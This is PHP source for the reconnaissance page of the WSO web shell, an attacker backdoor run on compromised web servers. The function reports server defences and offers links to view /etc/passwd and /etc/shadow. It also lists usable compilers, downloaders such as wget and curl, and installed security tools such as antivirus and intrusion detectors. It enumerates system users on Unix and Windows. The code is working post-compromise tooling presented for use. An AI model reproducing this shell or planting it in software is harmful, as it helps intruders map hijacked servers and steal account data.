<?php
function actionSecInfo() {
	wsoHeader();
	echo '<h1>Server security information</h1><div class=content>';
	function wsoSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>' . $n . ': </span>';
			if(strpos($v, "\n") === false)
				echo $v . '<br>';
			else
				echo '<pre class=ml1>' . $v . '</pre>';
		}
	}

	wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	wsoSecParam('Open base dir', @ini_get('open_basedir'));
	wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	wsoSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	wsoSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';

	if($GLOBALS['os'] == 'nix') {
            wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            wsoSecParam('OS version', @file_get_contents('/proc/version'));
            wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $item)
                    if(wsoWhich($item))
                        $temp[] = $item;
                wsoSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $item)
                    if(wsoWhich($item))
                        $temp[] = $item;
                wsoSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $item)
                    if(wsoWhich($item))
                        $temp[] = $item;
                wsoSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                wsoSecParam('HDD space', wsoEx('df -h'));
                wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
                echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
                if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
                    $temp = "";
                    for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
                        $uid = @posix_getpwuid($_POST['p2']);
                        if ($uid)
                            $temp .= join(':',$uid)."\n";
                    }
                    echo '<br/>';
                    wsoSecParam('Users', $temp);
                }
            }
	} else {
		wsoSecParam('OS Version',wsoEx('ver'));
		wsoSecParam('Account Settings',wsoEx('net accounts'));
		wsoSecParam('User Accounts',wsoEx('net user'));
	}
	echo '</div>';
	wsoFooter();
}
